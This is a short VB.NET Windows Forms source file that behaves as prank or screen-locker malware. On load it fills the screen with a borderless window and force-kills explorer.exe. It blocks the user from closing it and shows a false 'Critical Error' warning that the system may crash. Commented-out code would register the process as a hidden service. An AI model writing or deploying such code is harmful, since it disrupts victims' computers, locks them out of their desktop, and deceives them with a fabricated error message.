﻿Public Class Form1
    '    Public Declare Function GetCurrentProcessId _
    'Lib "kernel32" () As Long
    '    Public Declare Function GetCurrentProcess _
    '    Lib "kernel32" () As Long
    '    Public Declare Function RegisterServiceProcess _
    '    Lib "kernel32" (ByVal dwProcessID As Long, _
    '    ByVal dwType As Long) As Long

    '    Public Const RSP_SIMPLE_SERVICE = 1
    '    Public Const RSP_UNREGISTER_SERVICE = 0


    Public Shared Sub Kill_Main()
        Dim proclist() As Process = Process.GetProcessesByName("explorer")
        REM For Each p As Process In proclist
        REM p.Kill()
        REM Next
        Shell("taskkill /f /im explorer.exe")

    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        FormBorderStyle = FormBorderStyle.None
        WindowState = FormWindowState.Maximized
        Kill_Main()
        'MakeMeService()
    End Sub
    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        If (e.CloseReason = CloseReason.UserClosing) Then
            e.Cancel = True
            MessageBox.Show("This may cause the sytem to crash!", "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Error)

        End If
    End Sub
    'Public Sub MakeMeService()
    '    Dim pid As Long
    '    Dim regserv As Long

    '    pid = GetCurrentProcessId()
    '    regserv = RegisterServiceProcess(pid, RSP_SIMPLE_SERVICE)
    'End Sub
    'Public Sub UnMakeMeService()
    '    Dim pid As Long
    '    Dim regserv As Long

    '    pid = GetCurrentProcessId()
    '    regserv = RegisterServiceProcess(pid, RSP_UNREGISTER_SERVICE)
    'End Sub
End Class
